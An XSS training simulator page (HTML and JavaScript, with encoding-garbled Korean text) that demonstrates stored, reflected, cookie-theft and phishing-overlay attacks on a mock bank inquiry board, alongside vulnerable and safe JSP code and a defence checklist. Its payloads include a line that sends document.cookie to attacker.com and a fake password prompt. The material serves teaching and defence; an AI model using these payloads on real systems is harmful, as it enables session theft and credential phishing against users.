<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ê¸ˆìœµê¶Œ XSS ëª¨ì˜í•´í‚¹ ì‹œë®¬ë ˆì´í„°</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;500;700;900&display=swap');
        body { font-family: 'Noto Sans KR', sans-serif; }
        .code-font { font-family: 'Courier New', monospace; }
    </style>
</head>
<body class="bg-gray-100 p-4">

    <!-- í‰ê°€ê¸°ì¤€ ë°°ë„ˆ -->
    <div class="max-w-7xl mx-auto mb-4">
        <div class="bg-red-600 text-white p-4 rounded-lg shadow-lg">
            <div class="flex items-center gap-3">
                <i class="fas fa-clipboard-check text-2xl"></i>
                <div>
                    <h1 class="font-bold text-lg">ì „ìê¸ˆìœµê¸°ë°˜ì‹œì„¤ ë³´ì•ˆ ì·¨ì•½ì  í‰ê°€ê¸°ì¤€ - WEB-SER-041</h1>
                    <p class="text-sm">í¬ë¡œìŠ¤ì‚¬ì´íŠ¸ ìŠ¤í¬ë¦½íŒ… (XSS) | ìœ„í—˜ë„: 4 (ë†’ìŒ) | í†µì œêµ¬ë¶„: 5.8.4 ì„œë¹„ìŠ¤ ë³´í˜¸</p>
                </div>
            </div>
        </div>
    </div>

    <!-- ë©”ì¸ ì»¨í…ì¸  -->
    <div class="max-w-7xl mx-auto">
        <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
            
            <!-- ì¢Œì¸¡: ì·¨ì•½í•œ ì‹œìŠ¤í…œ -->
            <div class="space-y-4">
                
                <!-- ì€í–‰ í—¤ë” -->
                <div class="bg-blue-600 text-white p-4 rounded-lg shadow-lg">
                    <div class="flex items-center gap-3">
                        <i class="fas fa-building-columns text-2xl"></i>
                        <div>
                            <h2 class="text-xl font-bold">OOì€í–‰</h2>
                            <p class="text-sm">ì¸í„°ë„·ë±…í‚¹ ê²Œì‹œíŒ ì‹œìŠ¤í…œ</p>
                        </div>
                    </div>
                    <div class="mt-2 bg-red-500 px-3 py-1 rounded text-sm">
                        <i class="fas fa-exclamation-triangle"></i> ì·¨ì•½ì : ì…ë ¥ê°’ í•„í„°ë§ ë¯¸í¡
                    </div>
                </div>

                <!-- ì…ë ¥ í¼ -->
                <div class="bg-white p-5 rounded-lg shadow-lg">
                    <h3 class="font-bold text-lg mb-3 flex items-center gap-2">
                        <i class="fas fa-comment-dots text-red-600"></i>
                        ê³ ê°ì„¼í„° ë¬¸ì˜ ê²Œì‹œíŒ
                    </h3>
                    
                    <label class="block text-sm font-bold mb-2">ê³ ê°ëª…</label>
                    <input type="text" id="customerName" 
                           class="w-full p-2 border border-gray-300 rounded mb-3" 
                           value="ê¹€ì² ìˆ˜">
                    
                    <label class="block text-sm font-bold mb-2">ë¬¸ì˜ ë‚´ìš©</label>
                    <textarea id="xssInput" 
                              class="w-full h-32 p-2 border border-gray-300 rounded mb-3"
                              placeholder="ë¬¸ì˜í•˜ì‹¤ ë‚´ìš©ì„ ì…ë ¥í•˜ì„¸ìš”">ê³„ì¢Œì´ì²´ê°€ ì•ˆë©ë‹ˆë‹¤.</textarea>
                    
                    <div class="flex justify-between">
                        <button onclick="resetInput()" 
                                class="bg-gray-500 hover:bg-gray-600 text-white px-4 py-2 rounded">
                            <i class="fas fa-redo"></i> ì´ˆê¸°í™”
                        </button>
                        <button onclick="submitVulnerable()" 
                                class="bg-red-600 hover:bg-red-700 text-white px-6 py-2 rounded">
                            <i class="fas fa-paper-plane"></i> ë¬¸ì˜ ë“±ë¡
                        </button>
                    </div>
                </div>

                <!-- ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ ë²„íŠ¼ -->
                <div class="bg-gray-800 text-white p-4 rounded-lg shadow-lg">
                    <h3 class="font-bold mb-3 flex items-center gap-2">
                        <i class="fas fa-flask text-red-400"></i>
                        XSS ê³µê²© ì‹œë‚˜ë¦¬ì˜¤
                    </h3>
                    <div class="space-y-2">
                        <button onclick="setPayload(1)" 
                                class="w-full text-left bg-red-900 hover:bg-red-800 px-3 py-2 rounded text-sm">
                            <i class="fas fa-database"></i> ì‹œë‚˜ë¦¬ì˜¤ 1: Stored XSS
                        </button>
                        <button onclick="setPayload(2)" 
                                class="w-full text-left bg-orange-900 hover:bg-orange-800 px-3 py-2 rounded text-sm">
                            <i class="fas fa-link"></i> ì‹œë‚˜ë¦¬ì˜¤ 2: Reflected XSS
                        </button>
                        <button onclick="setPayload(3)" 
                                class="w-full text-left bg-purple-900 hover:bg-purple-800 px-3 py-2 rounded text-sm">
                            <i class="fas fa-cookie-bite"></i> ì‹œë‚˜ë¦¬ì˜¤ 3: ì¿ í‚¤ íƒˆì·¨
                        </button>
                        <button onclick="setPayload(4)" 
                                class="w-full text-left bg-yellow-900 hover:bg-yellow-800 px-3 py-2 rounded text-sm">
                            <i class="fas fa-fish-fins"></i> ì‹œë‚˜ë¦¬ì˜¤ 4: í”¼ì‹± í˜ì´ì§€
                        </button>
                    </div>
                </div>

                <!-- ì·¨ì•½í•œ ì½”ë“œ -->
                <div class="bg-gray-900 text-white p-4 rounded-lg shadow-lg">
                    <div class="flex justify-between items-center mb-3">
                        <h3 class="font-bold text-red-400">
                            <i class="fas fa-skull-crossbones"></i> ì·¨ì•½í•œ JSP ì½”ë“œ
                        </h3>
                        <span class="text-xs bg-red-600 px-2 py-1 rounded">ìœ„í—˜</span>
                    </div>
                    <pre class="code-font text-xs overflow-x-auto"><code><span class="text-gray-500">// âŒ ì·¨ì•½í•œ ì½”ë“œ</span>
&lt;%
  String name = request.getParameter("name");
  String content = request.getParameter("content");
%&gt;

<span class="text-red-400">// ì…ë ¥ê°’ì„ ê·¸ëŒ€ë¡œ ì¶œë ¥ (XSS ì·¨ì•½!)</span>
&lt;div&gt;
  &lt;h3&gt;&lt;%= name %&gt;&lt;/h3&gt;
  &lt;p&gt;&lt;%= content %&gt;&lt;/p&gt;
&lt;/div&gt;</code></pre>
                </div>

            </div>

            <!-- ìš°ì¸¡: ê²°ê³¼ ë° ì•ˆì „í•œ ì½”ë“œ -->
            <div class="space-y-4">
                
                <!-- ë¸Œë¼ìš°ì € ì‹¤í–‰ ê²°ê³¼ -->
                <div class="bg-white rounded-lg shadow-lg overflow-hidden">
                    <div class="bg-gray-800 text-white px-4 py-3 flex justify-between items-center">
                        <h3 class="font-bold">
                            <i class="fas fa-browser"></i> ë¸Œë¼ìš°ì € ì‹¤í–‰ ê²°ê³¼
                        </h3>
                        <span id="statusBadge" class="text-xs bg-green-500 text-gray-900 px-3 py-1 rounded">
                            ëŒ€ê¸°ì¤‘
                        </span>
                    </div>
                    <div id="browserView" class="p-5 min-h-[300px] bg-white">
                        <div class="text-center text-gray-400 py-10">
                            <i class="fas fa-browser text-5xl mb-3 opacity-30"></i>
                            <p class="text-sm">ê²Œì‹œê¸€ì´ í‘œì‹œë©ë‹ˆë‹¤</p>
                        </div>
                    </div>
                </div>

                <!-- ê³µê²© ë‹¨ê³„ -->
                <div id="attackStages" class="hidden bg-red-100 border-l-4 border-red-600 p-4 rounded-lg">
                    <h4 class="font-bold text-red-700 mb-2 flex items-center gap-2">
                        <i class="fas fa-list-ol"></i> ê³µê²© ì§„í–‰ ë‹¨ê³„
                    </h4>
                    <div id="stagesContent" class="text-sm text-red-700 space-y-1"></div>
                </div>

                <!-- í„°ë¯¸ë„ ì¶œë ¥ -->
                <div id="terminalBox" class="hidden bg-black text-green-400 p-4 rounded-lg shadow-lg">
                    <div class="font-bold mb-2 text-xs">
                        <i class="fas fa-terminal"></i> ATTACKER CONSOLE
                    </div>
                    <div id="terminalLines" class="code-font text-xs space-y-1 max-h-[200px] overflow-y-auto"></div>
                </div>

                <!-- ì•ˆì „í•œ ì½”ë“œ -->
                <div class="bg-gray-900 text-white p-4 rounded-lg shadow-lg">
                    <div class="flex justify-between items-center mb-3">
                        <h3 class="font-bold text-green-400">
                            <i class="fas fa-shield-halved"></i> ì•ˆì „í•œ JSP ì½”ë“œ
                        </h3>
                        <span class="text-xs bg-green-600 px-2 py-1 rounded">ê¶Œì¥</span>
                    </div>
                    <pre class="code-font text-xs overflow-x-auto max-h-[300px]"><code><span class="text-green-400">// âœ… ì•ˆì „í•œ ì½”ë“œ (JSTL ì‚¬ìš©)</span>
&lt;%@ taglib uri="http://java.sun.com/jsp/jstl/core" 
           prefix="c" %&gt;

<span class="text-green-400">// 1. JSTL &lt;c:out&gt; ìë™ ì´ìŠ¤ì¼€ì´í”„</span>
&lt;div&gt;
  &lt;h3&gt;&lt;c:out value="${name}" /&gt;&lt;/h3&gt;
  &lt;p&gt;&lt;c:out value="${content}" /&gt;&lt;/p&gt;
&lt;/div&gt;

<span class="text-gray-500">// ë˜ëŠ” OWASP Encoder ì‚¬ìš©</span>
&lt;%@ page import="org.owasp.encoder.Encode" %&gt;
&lt;%
  String safeName = Encode.forHtml(name);
  String safeContent = Encode.forHtml(content);
%&gt;

&lt;div&gt;
  &lt;h3&gt;&lt;%= safeName %&gt;&lt;/h3&gt;
  &lt;p&gt;&lt;%= safeContent %&gt;&lt;/p&gt;
&lt;/div&gt;</code></pre>
                </div>

                <!-- ë°©ì–´ ì²´í¬ë¦¬ìŠ¤íŠ¸ -->
                <div class="bg-white p-4 rounded-lg shadow-lg">
                    <h3 class="font-bold mb-3 flex items-center gap-2">
                        <i class="fas fa-list-check text-red-600"></i>
                        XSS ë°©ì–´ ì²´í¬ë¦¬ìŠ¤íŠ¸
                    </h3>
                    <div class="space-y-2 text-sm">
                        <div class="flex items-start gap-2">
                            <i class="fas fa-check text-green-500 mt-1"></i>
                            <div><strong>HTML Escaping:</strong> &lt; &gt; " ' & ë¬¸ì ë³€í™˜</div>
                        </div>
                        <div class="flex items-start gap-2">
                            <i class="fas fa-check text-green-500 mt-1"></i>
                            <div><strong>ì…ë ¥ê°’ ê²€ì¦:</strong> í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ë°©ì‹</div>
                        </div>
                        <div class="flex items-start gap-2">
                            <i class="fas fa-check text-green-500 mt-1"></i>
                            <div><strong>CSP ì ìš©:</strong> script-src 'self'</div>
                        </div>
                        <div class="flex items-start gap-2">
                            <i class="fas fa-check text-green-500 mt-1"></i>
                            <div><strong>HttpOnly Cookie:</strong> JS ì ‘ê·¼ ì°¨ë‹¨</div>
                        </div>
                    </div>
                </div>

                <!-- í‰ê°€ íŒì • -->
                <div id="judgementBox" class="hidden bg-gray-900 text-white p-4 rounded-lg">
                    <h3 class="font-bold text-indigo-400 mb-2 text-sm">
                        <i class="fas fa-gavel"></i> í‰ê°€ íŒì •
                    </h3>
                    <div class="text-xs space-y-1">
                        <div><strong>í‰ê°€í•­ëª©:</strong> WEB-SER-041 XSS</div>
                        <div><strong>íŒì •:</strong> <span id="judgement"></span></div>
                        <div><strong>ê·¼ê±°:</strong> <span id="evidence"></span></div>
                    </div>
                </div>

                <!-- í”¼í•´ ì‹œë‚˜ë¦¬ì˜¤ -->
                <div id="damageBox" class="hidden bg-red-700 text-white p-4 rounded-lg">
                    <h3 class="font-bold mb-3">
                        <i class="fas fa-fire"></i> ê¸ˆìœµê¶Œ XSS í”¼í•´ ì‚¬ë¡€
                    </h3>
                    <div class="space-y-2 text-sm">
                        <div class="flex gap-2">
                            <span class="font-bold">1.</span>
                            <div><strong>ì„¸ì…˜ ì¿ í‚¤ íƒˆì·¨</strong><br>ê³„ì¢Œ íƒˆì·¨ ê°€ëŠ¥</div>
                        </div>
                        <div class="flex gap-2">
                            <span class="font-bold">2.</span>
                            <div><strong>í”¼ì‹± í˜ì´ì§€ ì‚½ì…</strong><br>ë¹„ë°€ë²ˆí˜¸ ìˆ˜ì§‘</div>
                        </div>
                        <div class="flex gap-2">
                            <span class="font-bold">3.</span>
                            <div><strong>í‚¤ë¡œê¹… ìŠ¤í¬ë¦½íŠ¸</strong><br>ì…ë ¥ê°’ íƒˆì·¨</div>
                        </div>
                        <div class="flex gap-2">
                            <span class="font-bold">4.</span>
                            <div><strong>ë¬´ë‹¨ ì´ì²´ ì‹¤í–‰</strong><br>ê¸ˆì „ í”¼í•´</div>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>

    <script>
        function getPayload(type) {
            if (type === 1) {
                return "<script>alert('XSS ê³µê²©! ì¿ í‚¤: ' + document.cookie)<\/script>";
            } else if (type === 2) {
                return '<img src=x onerror="alert(\'Reflected XSS\')">';
            } else if (type === 3) {
                return "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie);<\/script>";
            } else if (type === 4) {
                var phishingHTML = '';
                phishingHTML += '<div id="phishingOverlay" onclick="if(event.target.id===\'phishingOverlay\')this.remove()" ';
                phishingHTML += 'style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);';
                phishingHTML += 'z-index:9999;padding:50px;cursor:pointer">';
                phishingHTML += '<div style="max-width:400px;margin:auto;background:white;border:2px solid red;';
                phishingHTML += 'padding:30px;border-radius:10px;position:relative;cursor:default">';
                phishingHTML += '<button onclick="document.getElementById(\'phishingOverlay\').remove();event.stopPropagation()" ';
                phishingHTML += 'style="position:absolute;top:10px;right:10px;background:red;color:white;border:none;';
                phishingHTML += 'width:30px;height:30px;border-radius:50%;cursor:pointer;font-size:18px;font-weight:bold">Ã—</button>';
                phishingHTML += '<h2 style="color:red;text-align:center;margin-bottom:15px">ğŸ”’ ë³´ì•ˆ ì¸ì¦ í•„ìš”</h2>';
                phishingHTML += '<p style="text-align:center;margin-bottom:20px">ë³¸ì¸ í™•ì¸ì„ ìœ„í•´<br>ë¹„ë°€ë²ˆí˜¸ë¥¼ ë‹¤ì‹œ ì…ë ¥í•´ì£¼ì„¸ìš”</p>';
                phishingHTML += '<input type="password" style="width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;';
                phishingHTML += 'box-sizing:border-box" placeholder="ë¹„ë°€ë²ˆí˜¸">';
                phishingHTML += '<button style="width:100%;padding:10px;background:#0066cc;color:white;border:none;';
                phishingHTML += 'border-radius:5px;margin-bottom:10px;cursor:pointer">í™•ì¸</button>';
                phishingHTML += '<div style="background:#fff3cd;border:1px solid #ffc107;padding:10px;border-radius:5px;margin-top:15px">';
                phishingHTML += '<p style="text-align:center;color:red;font-size:12px;font-weight:bold;margin:5px 0">âš ï¸ XSS ê³µê²© ì‹œë®¬ë ˆì´ì…˜</p>';
                phishingHTML += '<p style="text-align:center;color:#856404;font-size:11px;margin:5px 0">ê°€ì§œ ë¡œê·¸ì¸ í¼ (í”¼ì‹±)</p>';
                phishingHTML += '<p style="text-align:center;color:gray;font-size:10px;margin:5px 0">ë‹«ê¸°: X ë²„íŠ¼ ë˜ëŠ” ë°°ê²½ í´ë¦­</p>';
                phishingHTML += '</div></div></div>';
                return phishingHTML;
            }
            return '';
        }

        function resetInput() {
            document.getElementById('customerName').value = 'ê¹€ì² ìˆ˜';
            document.getElementById('xssInput').value = 'ê³„ì¢Œì´ì²´ê°€ ì•ˆë©ë‹ˆë‹¤.';
            document.getElementById('browserView').innerHTML = 
                '<div class="text-center text-gray-400 py-10">' +
                '<i class="fas fa-browser text-5xl mb-3 opacity-30"></i>' +
                '<p class="text-sm">ê²Œì‹œê¸€ì´ í‘œì‹œë©ë‹ˆë‹¤</p></div>';
            document.getElementById('attackStages').classList.add('hidden');
            document.getElementById('terminalBox').classList.add('hidden');
            document.getElementById('judgementBox').classList.add('hidden');
            document.getElementById('damageBox').classList.add('hidden');
            document.getElementById('statusBadge').textContent = 'ëŒ€ê¸°ì¤‘';
            document.getElementById('statusBadge').className = 'text-xs bg-green-500 text-gray-900 px-3 py-1 rounded';
        }

        function setPayload(type) {
            document.getElementById('xssInput').value = getPayload(type);
        }

        async function submitVulnerable() {
            var name = document.getElementById('customerName').value;
            var content = document.getElementById('xssInput').value;
            var browserView = document.getElementById('browserView');
            var badge = document.getElementById('statusBadge');
            
            document.getElementById('attackStages').classList.add('hidden');
            document.getElementById('terminalBox').classList.add('hidden');
            document.getElementById('terminalLines').innerHTML = '';
            document.getElementById('judgementBox').classList.add('hidden');
            document.getElementById('damageBox').classList.add('hidden');

            badge.textContent = 'ì²˜ë¦¬ì¤‘...';
            badge.className = 'text-xs bg-yellow-500 text-gray-900 px-3 py-1 rounded';
            browserView.innerHTML = '<div class="text-center text-blue-500 py-10">' +
                '<i class="fas fa-spinner fa-spin text-4xl"></i>' +
                '<p class="mt-3">ê²Œì‹œê¸€ ë“±ë¡ ì¤‘...</p></div>';
            
            await sleep(800);

            var isXSS = content.indexOf('<script>') !== -1 || 
                        content.indexOf('onerror=') !== -1 || 
                        content.indexOf('<img') !== -1 ||
                        content.indexOf('<div') !== -1;

            if (isXSS) {
                document.getElementById('attackStages').classList.remove('hidden');
                document.getElementById('stagesContent').innerHTML = 
                    '<div>1. ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ í¬í•¨ëœ ê²Œì‹œê¸€ ë“±ë¡</div>' +
                    '<div>2. DBì— ìŠ¤í¬ë¦½íŠ¸ê°€ ê·¸ëŒ€ë¡œ ì €ì¥</div>' +
                    '<div>3. ë‹¤ë¥¸ ì‚¬ìš©ì ì¡°íšŒ ì‹œ ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰</div>';

                document.getElementById('terminalBox').classList.remove('hidden');
                addTerminalLine('> XSS í˜ì´ë¡œë“œ íƒì§€');
                await sleep(500);
                addTerminalLine('> ì…ë ¥ê°’ í•„í„°ë§ ì—†ìŒ');
                await sleep(500);

                if (content.indexOf('document.cookie') !== -1) {
                    addTerminalLine('> [!] ì¿ í‚¤ íƒˆì·¨ ì‹œë„!', 'text-red-400');
                    
                    browserView.innerHTML = 
                        '<div class="border-l-4 border-red-500 bg-red-50 p-4">' +
                        '<div class="flex items-center gap-2 mb-3">' +
                        '<strong>' + escapeHtml(name) + '</strong>' +
                        '<span class="text-xs text-gray-500">2024-12-08</span></div>' +
                        '<div class="mb-3">' + content + '</div>' +
                        '<div class="bg-red-900 text-red-100 p-3 rounded text-xs">' +
                        '<div class="font-bold">âš ï¸ XSS ê³µê²© ì‹¤í–‰ ì¤‘...</div>' +
                        '<div>ì¿ í‚¤ íƒˆì·¨: JSESSIONID=7A8F9B...</div>' +
                        '<div>ì „ì†¡: http://attacker.com/steal</div></div></div>';
                    
                    await sleep(1000);
                    addTerminalLine('> ì„¸ì…˜ ì¿ í‚¤ íƒˆì·¨ ì™„ë£Œ!', 'text-red-400');
                    
                } else if (content.indexOf('position:fixed') !== -1 || content.indexOf('phishingOverlay') !== -1) {
                    addTerminalLine('> [!] í”¼ì‹± í˜ì´ì§€ ì‚½ì…!', 'text-red-400');
                    browserView.innerHTML = content;
                    await sleep(1000);
                    addTerminalLine('> ê°€ì§œ ë¡œê·¸ì¸ í¼ í‘œì‹œ', 'text-red-400');
                    
                } else if (content.indexOf('onerror=') !== -1) {
                    addTerminalLine('> [!] Reflected XSS!', 'text-red-400');
                    browserView.innerHTML = 
                        '<div class="border-l-4 border-orange-500 bg-orange-50 p-4">' +
                        '<div class="flex items-center gap-2 mb-3">' +
                        '<strong>' + escapeHtml(name) + '</strong></div>' +
                        '<div>' + content + '</div>' +
                        '<div class="mt-3 bg-orange-900 text-orange-100 p-2 rounded text-xs">' +
                        'âš ï¸ onerror ì´ë²¤íŠ¸ ì‹¤í–‰!</div></div>';
                    
                    setTimeout(function() { alert('Reflected XSS - ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰!'); }, 500);
                    
                } else {
                    addTerminalLine('> [!] Stored XSS!', 'text-red-400');
                    browserView.innerHTML = 
                        '<div class="border-l-4 border-red-500 bg-red-50 p-4">' +
                        '<div class="flex items-center gap-2 mb-3">' +
                        '<strong>' + escapeHtml(name) + '</strong></div>' +
                        '<div>' + content + '</div>' +
                        '<div class="mt-3 bg-red-900 text-red-100 p-2 rounded text-xs">' +
                        'âš ï¸ XSS ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰!</div></div>';
                    
                    setTimeout(function() { alert('XSS ê³µê²©! ì•…ì„± ì½”ë“œ ì‹¤í–‰!'); }, 500);
                }

                badge.textContent = 'XSS ê³µê²©';
                badge.className = 'text-xs bg-red-500 text-white px-3 py-1 rounded';
                
                document.getElementById('judgementBox').classList.remove('hidden');
                document.getElementById('judgement').innerHTML = '<span class="text-red-400">ì·¨ì•½</span>';
                document.getElementById('evidence').textContent = 'ì…ë ¥ê°’ í•„í„°ë§ ì—†ìŒ';
                document.getElementById('damageBox').classList.remove('hidden');

            } else {
                browserView.innerHTML = 
                    '<div class="border-l-4 border-blue-500 bg-blue-50 p-4">' +
                    '<div class="flex items-center gap-2 mb-3">' +
                    '<i class="fas fa-user text-blue-600"></i>' +
                    '<strong>' + escapeHtml(name) + '</strong>' +
                    '<span class="text-xs text-gray-500">2024-12-08</span></div>' +
                    '<div>' + escapeHtml(content) + '</div></div>';

                badge.textContent = '200 OK';
                badge.className = 'text-xs bg-green-500 text-gray-900 px-3 py-1 rounded';
                
                document.getElementById('judgementBox').classList.remove('hidden');
                document.getElementById('judgement').innerHTML = '<span class="text-green-400">ì–‘í˜¸</span>';
                document.getElementById('evidence').textContent = 'XSS ì—†ìŒ';
            }
        }

        function escapeHtml(text) {
            var div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        function addTerminalLine(text, color) {
            var div = document.createElement('div');
            div.className = color || 'text-green-400';
            div.textContent = text;
            document.getElementById('terminalLines').appendChild(div);
        }

        function sleep(ms) {
            return new Promise(function(resolve) {
                setTimeout(resolve, ms);
            });
        }
    </script>
</body>
</html>